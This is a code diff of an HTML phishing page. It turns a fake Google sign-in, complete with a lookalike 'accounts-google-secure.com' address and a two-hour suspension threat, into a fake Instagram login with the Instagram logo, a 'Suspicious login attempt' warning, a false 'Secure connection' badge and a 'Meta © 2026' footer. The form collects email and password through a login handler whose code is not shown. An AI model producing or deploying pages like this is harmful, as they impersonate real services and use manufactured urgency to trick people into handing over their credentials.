@@ -1,35 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sign in</title>
+    <title>Instagram</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <p style="font-size:12px; color:gray;">
-    https://accounts-google-secure.com/login
-</p>
 
     <div class="login-box">
-        <h2 style="text-align:left;">Sign in</h2>
-<p style="text-align:left; color:gray;">Use your account</p>
-        <p style="color:red; font-size:14px;">
-    ⚠️ Suspicious login detected. Verify within 2 hours to avoid account suspension.
-</p>
+        <img src="assets/instagram-logo.jpg" width="150">
+         <h1 style="font-family: cursive;">Instagram</h1>
+
+    <p style="color:red; font-size:13px;">
+        Suspicious login attempt. Please log in again.
+    </p>
 
         <form onsubmit="handleLogin(event)">
             <input type="text" placeholder="Email or phone" required><br><br>
-            <p style="font-size:13px; color:#1a73e8; cursor:pointer;">
-    Forgot email?
-</p>
+            
             <input type="password" placeholder="Password" required><br><br>
             <p style="font-size:12px; color:gray;">
     🔒 Secure connection
 </p>
 
-            <button type="submit">Next</button>
+            <button type="submit">Log In</button>
         </form>
-        <p style="font-size:12px; color:gray; margin-top:15px;">
-        Google LLC, 2026
+        <p style="color:#385185; font-size:14px; margin-top:10px;">
+        Log in with Facebook
+    </p>
+
+    <p style="font-size:12px; color:gray;">
+        Forgotten your password?
+    </p>
+
+    <p style="font-size:11px; color:gray; margin-top:15px;">
+        Meta © 2026
     </p>
     </div>
 
